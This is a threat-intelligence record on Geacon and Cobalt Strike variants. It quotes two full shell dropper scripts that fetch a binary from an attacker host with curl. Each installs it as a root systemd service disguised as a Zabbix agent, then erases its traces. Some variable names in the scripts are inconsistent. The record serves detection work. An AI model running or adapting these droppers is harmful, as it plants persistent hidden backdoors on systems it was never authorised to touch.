title: 'Geacon and Geacon_Pro: A Constant Menace to Linux and Windows Systems'
description: The report discusses the analysis of multiple scripts, ELF files, and
  webshells that masquerade as legitimate tools but are actually used for malicious
  purposes. It highlights the use of Cobalt Strike variants and Geacon Pro servers.
attribution: ''
malware_families:
- Cobalt Strike
- Geacon
cves: []
ttps:
  processes:
  - ha.exe
  - m_arm64
  command_lines:
  - '#!/bin/sh

    URL="http://down.chinaunion_info/dkxtzLeppoUwg676m9AmSgl/s2"

    NAME="agents_install"

    curl -o /tmp/$NAME $URL

    chmod +x /tmp/$NAME

    SERVICE_FILE="/etc/systemd/system/SNAME.service"

    cat <<EOF > $SERVICE_FILE

    [Unit]

    Description=Zabbix Agent Service

    After=network.target

    [Service]

    ExecStart=/tmp/$NAME

    Restart=always

    User=root

    [Install]

    WantedBy=multi-user.target

    EOF

    systemctl daemon-reload

    systemctl start $NAME.service

    rm -f /tmp/si.sh'
  - '#!/bin/bash

    URL="http://down.chinaunion_info/dkxtzLeppolwg676m9AmSgl/falis"

    NAME="agents_1install"

    curl -o /tmp/$NAME $URL

    chmod +x /tmp/$NAME

    SERVICE_FILE="/etc/systemd/system/SNAME.service"

    cat <<EOF > $SERVICE_FILE

    [Unit]

    Description=Zabbix Agent Service

    After=network.target

    [Service]

    ExecStart=/tmp/$NAME

    Restart=always

    User=root

    [Install]

    WantedBy=multi-user.target

    EOF

    systemctl daemon-reload

    systemctl start $NAME.service

    systemctl enable SNAME.service

    rm -f /tmp/$S1_NAME

    rm -f [etc/systemd/system/$S1_NAME.service]

    systemctl stop $S1_NAME.service'
